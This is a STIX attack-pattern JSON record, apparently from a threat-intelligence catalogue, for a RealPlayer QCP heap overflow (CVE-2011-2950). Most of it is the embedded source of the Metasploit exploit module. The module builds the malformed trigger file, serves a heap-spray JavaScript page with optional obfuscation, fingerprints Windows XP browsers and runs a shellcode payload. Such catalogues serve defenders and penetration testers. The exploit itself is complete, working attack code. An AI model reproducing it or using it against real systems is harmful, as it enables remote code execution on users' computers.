{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--228ee5cb-a0f5-417c-9d02-a22a2ed4a74d",
    "created": "2024-08-14T16:40:22.135758Z",
    "modified": "2024-08-14T16:40:22.135763Z",
    "name": "\"RealNetworks Realplayer QCP Parsing Heap Overflow\"",
    "description": " This module exploits a heap overflow in Realplayer when handling a .QCP file. The specific flaw exists within qcpfformat.dll. A static 256 byte buffer is allocated on the heap and user-supplied data from the file is copied within a memory copy loop.  This allows a remote attacker to execute arbitrary code running in the context of the web browser via a .QCP file with a specially crafted \"fmt\" chunk. At this moment this module exploits the flaw on Windows XP IE6, IE7.  'License'     => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/realplayer_qcp.rb",
            "external_id": "realplayer_qcp.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-2950"
        },
        {
            "source_name": "reference",
            "url": "http://service.real.com/realplayer/security/08162011_player/en/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => \"RealNetworks Realplayer QCP Parsing Heap Overflow\",\n      'Description' => %q{\n          This module exploits a heap overflow in Realplayer when handling a .QCP file.\n          The specific flaw exists within qcpfformat.dll. A static 256 byte buffer is\n          allocated on the heap and user-supplied data from the file is copied within a\n          memory copy loop.\n\n          This allows a remote attacker to execute arbitrary code running in the context\n          of the web browser via a .QCP file with a specially crafted \"fmt\" chunk.\n          At this moment this module exploits the flaw on Windows XP IE6, IE7.\n        },\n      'License'     => MSF_LICENSE,\n      'Author'      =>\n        [\n          'Sean de Regge', # Vulnerability discovery\n          'juan vazquez'   # Metasploit module\n        ],\n      'References' =>\n        [\n          ['CVE', '2011-2950'],\n          ['OSVDB', '74549'],\n          ['BID', '49172'],\n          # ZDI advisory\n          ['ZDI', '11-265'],\n          ['URL', 'http://service.real.com/realplayer/security/08162011_player/en/'],\n        ],\n      'Payload' =>\n        {\n          'Space' => 1024\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => \"process\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [ 'Automatic', {} ],\n          [ 'Internet Explorer 6 on XP SP3', { 'Nops' => \"%u1414%u1414\" } ],\n          [ 'Internet Explorer 7 on XP SP3', { 'Nops' => \"%u0c0c%u0c0c\" } ],\n        ],\n      'DisclosureDate' => '2011-08-16',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])\n      ])\n  end\n\n  def get_target(cli, request)\n    #Default target\n    my_target = target\n\n    vprint_status(\"User-Agent: #{request.headers['User-Agent']}\")\n\n    if target.name == 'Automatic'\n      agent = request.headers['User-Agent']\n      if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6\\.0/\n        #Windows XP + IE 6\n        my_target = targets[1]\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7\\.0/\n        #Windows XP + IE 7.0\n        my_target = targets[2]\n      elsif agent =~ /RMA/\n        #RealPlayer identifies itself as \"RMA/1.0 (compatible; RealMedia)\"\n        #when requesting our trigger file\n        return 'RMA'\n      else\n        #If we don't recognize the client, we don't fire the exploit\n        my_target = nil\n      end\n    end\n\n    return my_target\n  end\n\n  def exploit\n    #Set trigger file name\n    @filename = rand_text_alpha(rand(6) + 3)\n    #Create the trigger file\n    @trigger = build_trigger\n    super\n  end\n\n  def on_request_uri(cli, request)\n    #Pick the right target\n    vprint_status(\"Selecting target...\")\n    my_target = get_target(cli, request)\n    if my_target.nil?\n      print_error(\"Target not supported\")\n      send_not_found(cli)\n      return\n    end\n\n    vprint_status(\"URL: #{request.uri.to_s}\")\n\n    #Send the trigger file upon request\n    if request.uri.match(/\\.qcp$/)\n      print_status(\"Sending trigger file\")\n      send_response(cli, @trigger, { 'Content-Type' => 'application/octet-stream' })\n      return\n    end\n\n    vprint_status(\"Building shellcode...\")\n    code = Rex::Text.to_unescape(payload.encoded)\n\n    vprint_status(\"Building spray...\")\n    spray = build_spray(my_target, code)\n\n    #obfuscate on demand\n    vprint_status(\"Obfuscating javascript...\")\n    if datastore['OBFUSCATE']\n      spray = Rex::Exploitation::JSObfu.new(spray)\n      spray.obfuscate(memory_sensitive: true)\n    end\n\n    vprint_status(\"Building html...\")\n    #Value for the 'Src' parameter of our ActiveX control\n    trigger_file = \"\"\n    if (\"/\" == get_resource[-1,1])\n      trigger_file = get_resource[0, get_resource.length - 1]\n    else\n      trigger_file = get_resource\n    end\n    trigger_file << \"/#{@filename}.qcp\"\n\n\n    html = <<-EOS\n    <HTML>\n    <HEAD>\n    </HEAD>\n    <BODY>\n    <script language='javascript'>\n    #{spray}\n    </script>\n    <OBJECT ID=RVOCX CLASSID=\"clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA\" WIDTH=320 HEIGHT=240>\n    <PARAM NAME=\"SRC\" VALUE=\"#{trigger_file}\">\n    <PARAM NAME=\"CONTROLS\" VALUE=\"ImageWindow\">\n    <PARAM NAME=\"CONSOLE\" VALUE=\"one\">\n    <PARAM NAME=\"AUTOSTART\" VALUE=\"true\">\n    <EMBED SRC=\"#{trigger_file}\" WIDTH=320 HEIGHT=240 NOJAVA=true CONTROLS=ImageWindow CONSOLE=one AUTOSTART=true>\n    </OBJECT>\n    </BODY>\n    EOS\n\n    print_status(\"Sending #{self.name}\")\n    send_response( cli, html, {'Content-Type' => 'text/html'} )\n  end\n\n  def build_trigger()\n    overflow_size = 700\n    overflow_string = \"\\x11\" * 700\n\n    #riff_mark\n    trigger = \"\\x52\\x49\\x46\\x46\"\n    #total_size\n    trigger << [0xed44 + overflow_size].pack(\"V\")\n    #qlcm_tag\n    trigger << \"\\x51\\x4c\\x43\\x4d\"\n    #fmt_tag\n    trigger << \"\\x66\\x6d\\x74\\x20\"\n    #fmt_size\n    trigger << [0x96 + overflow_size].pack(\"V\")\n    #fmt_content\n    trigger << \"\\x01\\x00\\x8d\\xd4\\x89\\xe6\\x76\\x90\"\n    trigger << \"\\xb5\\x46\\x91\\xef\\x73\\x6a\\x51\\x00\"\n    trigger << \"\\xce\\xb4\\x01\\x00\\x54\\x49\\x41\\x20\"\n    trigger << \"\\x49\\x53\\x2d\\x31\\x32\\x37\\x20\\x45\"\n    trigger << \"\\x6e\\x68\\x61\\x6e\\x63\\x65\\x64\\x20\"\n    trigger << \"\\x56\\x61\\x72\\x69\\x61\\x62\\x6c\\x65\"\n    trigger << \"\\x20\\x52\\x61\\x74\\x65\\x20\\x43\\x6f\"\n    trigger << \"\\x64\\x65\\x63\\x2c\\x20\\x53\\x70\\x65\"\n    trigger << \"\\x65\\x63\\x68\\x20\\x53\\x65\\x72\\x76\"\n    trigger << \"\\x69\\x63\\x65\\x20\\x4f\\x70\\x74\\x69\"\n    trigger << \"\\x6f\\x6e\\x20\\x33\\x20\\x00\\x00\\x00\"\n    trigger << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    trigger << \"\\x00\\x00\\x00\\x00\\xc8\\x32\\x16\\x00\"\n    trigger << \"\\xa0\\x00\\x40\\x1f\\x10\\x00\\x05\\x00\"\n    trigger << \"\\x00\\x00\\x16\\x04\\x0a\\x03\\x05\\x02\"\n    trigger << \"\\x02\\x01\\x00\\x00\\x00\\x00\\x00\\x00\"\n    trigger << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    trigger << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    trigger << \"\\x00\\x00\\x00\\x00\\x00\\x00\"\n    trigger << overflow_string\n    #vrat_tag\n    trigger << \"\\x76\\x72\\x61\\x74\"\n    #vrat_size\n    trigger << [0x8].pack(\"V\")\n    #vrat_content\n    trigger << \"\\x01\\x00\\x00\\x00\\x06\\x13\\x00\\x00\"\n    #data_tag\n    trigger << \"\\x64\\x61\\x74\\x61\"\n    #data_size\n    trigger << [0xec8a].pack(\"V\")\n    #data_content\n    trigger << rand_text_alpha(0xec8a)\n    return trigger\n  end\n\n  def build_spray(mytarget, code)\n    randnop = rand_text_alpha(rand(100) + 1)\n    spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n\n    var code = unescape(\"#{code}\");\n    var #{randnop} = \"#{mytarget['Nops']}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x10000) nops += nops;\n    offset = nops.substring(0, 0x7BE0);\n    var shellcode = offset + code + nops.substring(0, 0x8000-offset.length-code.length);\n\n    while (shellcode.length < 0x20000) shellcode += shellcode;\n    block = shellcode.substring(0, (0x10000-6)/2);\n\n    heap_obj.gc();\n\n    for (var i=0; i < 0x1400; i++) {\n      heap_obj.alloc(block);\n    }\n    JS\n\n    spray = heaplib(spray)\n    return spray\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-08-16",
    "x_mitre_platforms": [
        "win'"
    ]
}